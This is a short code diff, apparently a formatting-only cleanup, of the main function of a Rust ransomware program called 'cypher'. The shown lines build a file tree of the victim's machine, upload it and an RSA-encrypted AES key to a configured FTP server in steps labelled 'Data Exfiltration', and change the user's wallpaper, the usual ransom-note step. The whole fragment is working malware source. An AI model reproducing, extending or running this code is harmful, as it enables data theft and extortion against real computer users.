@@ -42,7 +42,7 @@ fn main() {
     // ===================================================================================
     // STEP 4: File Tree Generation and Data Exfiltration
     // ===================================================================================
-    
+
     let hostname: String = env::var("COMPUTERNAME").unwrap_or(String::from("NOT DEFINED"));
     let exfiltration_base_path: String = format!("{}/", hostname);
 
@@ -69,10 +69,14 @@ fn main() {
     let _ = std::fs::write(file_tree_path.clone(), output);
 
     let remote_file_tree: String = exfiltration_base_path.clone() + "file_tree.txt";
-    let _ = cypher::ftp::upload_file(*cypher::config::SERVER_FTP, &remote_file_tree, &file_tree_path);
+    let _ = cypher::ftp::upload_file(
+        *cypher::config::SERVER_FTP,
+        &remote_file_tree,
+        &file_tree_path,
+    );
 
     // ===================================================================================
-    // STEP 6: Encrypting AES Key with RSA 
+    // STEP 6: Encrypting AES Key with RSA
     // ===================================================================================
     let aes_key_enc: Vec<u8> = cypher::lib::encrypt_aes_key(key, cypher::config::PUBLIC_KEY_PEM);
     let encoded_key: String = base64::encode(&aes_key_enc);
@@ -89,5 +93,5 @@ fn main() {
     let remote_file_tree: String = exfiltration_base_path + "key";
     let _ = cypher::ftp::upload_file(*cypher::config::SERVER_FTP, &remote_file_tree, &note_path);
 
-    let _ = cypher::lib::change_wallpaper(format!("C:\\Users\\{}",user).as_str());
+    let _ = cypher::lib::change_wallpaper(format!("C:\\Users\\{}", user).as_str());
 }
